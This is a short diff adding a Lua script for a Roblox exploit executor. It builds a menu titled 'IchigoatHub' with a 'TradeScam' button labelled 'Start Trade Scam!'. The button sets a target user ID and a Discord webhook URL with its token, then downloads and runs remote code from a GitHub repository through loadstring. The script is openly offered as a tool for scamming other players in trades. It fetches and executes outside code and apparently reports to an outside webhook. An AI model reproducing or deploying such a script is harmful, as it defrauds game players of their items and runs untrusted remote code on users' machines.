@@ -1,0 +1,14 @@
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local Window = Library.CreateLib("IchigoatHub", "Synapse")
+
+    --MAIN
+    local Main = Window:NewTab("Main")
+    local MainSection = Main:NewSection("Main")
+
+
+    MainSection:NewButton("TradeScam", "Start Trade Scam!", function()
+         _G.UserID = 2649363125;
+         _G.Webhook = "https://discord.com/api/webhooks/1063055675606962186/jTod7eXCbXFwBlXGCvCF41hYVGrC8dcUfTEDoGirBYg3Cx__pPuzx56EjMpvKUYVcpv8";
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MrFeastEz/PSX/main/scripts/main.lua"))();
+    end)
